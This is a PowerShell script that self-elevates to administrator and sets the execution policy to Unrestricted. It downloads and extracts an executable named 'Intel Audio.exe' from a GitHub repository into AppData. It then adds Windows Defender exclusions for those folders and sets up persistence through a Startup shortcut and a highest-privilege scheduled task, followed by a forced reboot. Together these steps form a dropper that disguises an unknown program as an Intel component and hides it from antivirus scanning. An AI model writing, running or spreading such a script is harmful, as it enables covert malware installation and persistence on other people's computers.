# Clear-Host
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
            $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
            Start-Process powershell -Verb runas -ArgumentList $CommandLine
            Exit
      }
}
  
#Elevated script content after that
$WScriptShell = New-Object -ComObject WScript.Shell
$FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutFile = "$FolderPath\Intel Audio.lnk"
$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio"
$TargetFile = "$TargetPath\Intel Audio.exe"
$TargetZip = "$TargetPath\Intel Audio.zip"

Set-ExecutionPolicy Unrestricted -Scope LocalMachine
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
New-Item -ItemType Directory -Force -Path $FolderPath
Write-Output "Shortcut folder created"
New-Item -ItemType Directory -Force -Path $TargetPath
Write-Output "Target folder created"
Invoke-WebRequest -Uri "https://github.com/silentoverride/test/raw/refs/heads/main/Intel Audio.zip" -OutFile $TargetZip
Write-Output "File downloaded"
Expand-Archive -Path $TargetZip -DestinationPath $TargetPath
Write-Output "File extracted"
Add-MpPreference -ExclusionPath $FolderPath
Add-MpPreference -ExclusionPath $TargetPath
Write-Output "Exclusions added"
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.WorkingDirectory = $TargetPath
$Shortcut.IconLocation = "$TargetPath\Intel Audio.exe,0"
$Shortcut.Save()
Write-Output "Shortcut created"
Remove-Item -Path $TargetZip -Force

$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskAction = New-ScheduledTaskAction -Execute '$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio\Intel Audio.exe'
Register-ScheduledTask -TaskName "Intel Audio" -Trigger $taskTrigger -Action $taskAction -RunLevel Highest -Force
$taskTrigger


Restart-Computer -Force
